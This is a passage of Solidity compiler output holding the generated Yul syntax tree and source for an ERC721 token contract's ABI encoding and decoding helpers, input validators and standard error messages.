deType":"YulIdentifier","src":"23820:3:15"},"nodeType":"YulFunctionCall","src":"23820:14:15"},{"hexValue":"4552433732313a20617070726f766520746f2063616c6c6572","kind":"string","nodeType":"YulLiteral","src":"23836:27:15","type":"","value":"ERC721: approve to caller"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23813:6:15"},"nodeType":"YulFunctionCall","src":"23813:51:15"},"nodeType":"YulExpressionStatement","src":"23813:51:15"}]},"name":"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23794:6:15","type":""}],"src":"23696:175:15"},{"body":{"nodeType":"YulBlock","src":"23983:122:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24005:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24013:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24001:3:15"},"nodeType":"YulFunctionCall","src":"24001:14:15"},{"hexValue":"4552433732313a2061646472657373207a65726f206973206e6f742061207661","kind":"string","nodeType":"YulLiteral","src":"24017:34:15","type":"","value":"ERC721: address zero is not a va"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23994:6:15"},"nodeType":"YulFunctionCall","src":"23994:58:15"},"nodeType":"YulExpressionStatement","src":"23994:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24073:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24081:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24069:3:15"},"nodeType":"YulFunctionCall","src":"24069:15:15"},{"hexValue":"6c6964206f776e6572","kind":"string","nodeType":"YulLiteral","src":"24086:11:15","type":"","value":"lid owner"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24062:6:15"},"nodeType":"YulFunctionCall","src":"24062:36:15"},"nodeType":"YulExpressionStatement","src":"24062:36:15"}]},"name":"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23975:6:15","type":""}],"src":"23877:228:15"},{"body":{"nodeType":"YulBlock","src":"24217:76:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24239:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24247:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24235:3:15"},"nodeType":"YulFunctionCall","src":"24235:14:15"},{"hexValue":"4552433732313a206d696e7420746f20746865207a65726f2061646472657373","kind":"string","nodeType":"YulLiteral","src":"24251:34:15","type":"","value":"ERC721: mint to the zero address"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24228:6:15"},"nodeType":"YulFunctionCall","src":"24228:58:15"},"nodeType":"YulExpressionStatement","src":"24228:58:15"}]},"name":"store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24209:6:15","type":""}],"src":"24111:182:15"},{"body":{"nodeType":"YulBlock","src":"24405:68:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24427:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24435:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24423:3:15"},"nodeType":"YulFunctionCall","src":"24423:14:15"},{"hexValue":"4552433732313a20696e76616c696420746f6b656e204944","kind":"string","nodeType":"YulLiteral","src":"24439:26:15","type":"","value":"ERC721: invalid token ID"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24416:6:15"},"nodeType":"YulFunctionCall","src":"24416:50:15"},"nodeType":"YulExpressionStatement","src":"24416:50:15"}]},"name":"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24397:6:15","type":""}],"src":"24299:174:15"},{"body":{"nodeType":"YulBlock","src":"24585:129:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24607:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24615:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24603:3:15"},"nodeType":"YulFunctionCall","src":"24603:14:15"},{"hexValue":"4552433732314d65746164617461203a2055524920717565727920666f72206e","kind":"string","nodeType":"YulLiteral","src":"24619:34:15","type":"","value":"ERC721Metadata : URI query for n"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24596:6:15"},"nodeType":"YulFunctionCall","src":"24596:58:15"},"nodeType":"YulExpressionStatement","src":"24596:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24675:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24683:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24671:3:15"},"nodeType":"YulFunctionCall","src":"24671:15:15"},{"hexValue":"6f6e6578697374656e7420746f6b656e","kind":"string","nodeType":"YulLiteral","src":"24688:18:15","type":"","value":"onexistent token"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24664:6:15"},"nodeType":"YulFunctionCall","src":"24664:43:15"},"nodeType":"YulExpressionStatement","src":"24664:43:15"}]},"name":"store_literal_in_memory_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24577:6:15","type":""}],"src":"24479:235:15"},{"body":{"nodeType":"YulBlock","src":"24826:114:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24848:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24856:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24844:3:15"},"nodeType":"YulFunctionCall","src":"24844:14:15"},{"hexValue":"4552433732313a20617070726f76616c20746f2063757272656e74206f776e65","kind":"string","nodeType":"YulLiteral","src":"24860:34:15","type":"","value":"ERC721: approval to current owne"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24837:6:15"},"nodeType":"YulFunctionCall","src":"24837:58:15"},"nodeType":"YulExpressionStatement","src":"24837:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24916:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24924:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24912:3:15"},"nodeType":"YulFunctionCall","src":"24912:15:15"},{"hexValue":"72","kind":"string","nodeType":"YulLiteral","src":"24929:3:15","type":"","value":"r"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24905:6:15"},"nodeType":"YulFunctionCall","src":"24905:28:15"},"nodeType":"YulExpressionStatement","src":"24905:28:15"}]},"name":"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24818:6:15","type":""}],"src":"24720:220:15"},{"body":{"nodeType":"YulBlock","src":"25052:142:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"25074:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"25082:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"25070:3:15"},"nodeType":"YulFunctionCall","src":"25070:14:15"},{"hexValue":"4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f","kind":"string","nodeType":"YulLiteral","src":"25086:34:15","type":"","value":"ERC721: approve caller is not to"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"25063:6:15"},"nodeType":"YulFunctionCall","src":"25063:58:15"},"nodeType":"YulExpressionStatement","src":"25063:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"25142:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"25150:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"25138:3:15"},"nodeType":"YulFunctionCall","src":"25138:15:15"},{"hexValue":"6b656e206f776e6572206f7220617070726f76656420666f7220616c6c","kind":"string","nodeType":"YulLiteral","src":"25155:31:15","type":"","value":"ken owner or approved for all"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"25131:6:15"},"nodeType":"YulFunctionCall","src":"25131:56:15"},"nodeType":"YulExpressionStatement","src":"25131:56:15"}]},"name":"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"25044:6:15","type":""}],"src":"24946:248:15"},{"body":{"nodeType":"YulBlock","src":"25243:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"25300:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25309:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25312:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25302:6:15"},"nodeType":"YulFunctionCall","src":"25302:12:15"},"nodeType":"YulExpressionStatement","src":"25302:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25266:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25291:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"25273:17:15"},"nodeType":"YulFunctionCall","src":"25273:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25263:2:15"},"nodeType":"YulFunctionCall","src":"25263:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25256:6:15"},"nodeType":"YulFunctionCall","src":"25256:43:15"},"nodeType":"YulIf","src":"25253:63:15"}]},"name":"validator_revert_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25236:5:15","type":""}],"src":"25200:122:15"},{"body":{"nodeType":"YulBlock","src":"25368:76:15","statements":[{"body":{"nodeType":"YulBlock","src":"25422:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25431:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25434:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25424:6:15"},"nodeType":"YulFunctionCall","src":"25424:12:15"},"nodeType":"YulExpressionStatement","src":"25424:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25391:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25413:5:15"}],"functionName":{"name":"cleanup_t_bool","nodeType":"YulIdentifier","src":"25398:14:15"},"nodeType":"YulFunctionCall","src":"25398:21:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25388:2:15"},"nodeType":"YulFunctionCall","src":"25388:32:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25381:6:15"},"nodeType":"YulFunctionCall","src":"25381:40:15"},"nodeType":"YulIf","src":"25378:60:15"}]},"name":"validator_revert_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25361:5:15","type":""}],"src":"25328:116:15"},{"body":{"nodeType":"YulBlock","src":"25492:78:15","statements":[{"body":{"nodeType":"YulBlock","src":"25548:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25557:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25560:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25550:6:15"},"nodeType":"YulFunctionCall","src":"25550:12:15"},"nodeType":"YulExpressionStatement","src":"25550:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25515:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25539:5:15"}],"functionName":{"name":"cleanup_t_bytes4","nodeType":"YulIdentifier","src":"25522:16:15"},"nodeType":"YulFunctionCall","src":"25522:23:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25512:2:15"},"nodeType":"YulFunctionCall","src":"25512:34:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25505:6:15"},"nodeType":"YulFunctionCall","src":"25505:42:15"},"nodeType":"YulIf","src":"25502:62:15"}]},"name":"validator_revert_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25485:5:15","type":""}],"src":"25450:120:15"},{"body":{"nodeType":"YulBlock","src":"25619:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"25676:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25685:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25688:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25678:6:15"},"nodeType":"YulFunctionCall","src":"25678:12:15"},"nodeType":"YulExpressionStatement","src":"25678:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25642:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25667:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"25649:17:15"},"nodeType":"YulFunctionCall","src":"25649:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25639:2:15"},"nodeType":"YulFunctionCall","src":"25639:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25632:6:15"},"nodeType":"YulFunctionCall","src":"25632:43:15"},"nodeType":"YulIf","src":"25629:63:15"}]},"name":"validator_revert_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25612:5:15","type":""}],"src":"25576:122:15"}]},"contents":"{\n\n    function abi_decode_available_length_t_bytes_memory_ptr(src, length, end) -> array {\n        array := allocate_memory(array_allocation_size_t_bytes_memory_ptr(length))\n        mstore(array, length)\n        let dst := add(array, 0x20)\n        if gt(add(src, length), end) { revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() }\n        copy_calldata_to_memory(src, dst, length)\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_t_bytes4(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bytes4(value)\n    }\n\n    function abi_decode_t_bytes4_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bytes4(value)\n    }\n\n    // bytes\n    function abi_decode_t_bytes_memory_ptr(offset, end) -> array {\n        if iszero(slt(add(offset, 0x1f), end)) { revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() }\n        let length := calldataload(offset)\n        array := abi_decode_available_length_t_bytes_memory_ptr(add(offset, 0x20), length, end)\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2 {\n        if slt(sub(dataEnd, headStart), 96) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr(headStart, dataEnd) -> value0, value1, value2, value3 {\n        if slt(sub(dataEnd, headStart), 128) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := calldataload(add(headStart, 96))\n            if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }\n\n            value3 := abi_decode_t_bytes_memory_ptr(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_bool(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_bytes4(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bytes4(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_bytes4_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bytes4_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 45)\n        store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 50)\n        store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 37)\n        store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 28)\n        store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 36)\n        store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 25)\n        store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 41)\n        store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 32)\n        store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 24)\n        store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 48)\n        store_literal_in_memory_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 33)\n        store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 61)\n        store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed(headStart , value3, value2, value1, value0) -> tail {\n        tail := add(headStart, 128)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n        mstore(add(headStart, 96), sub(tail, headStart))\n        tail := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value3,  tail)\n\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := 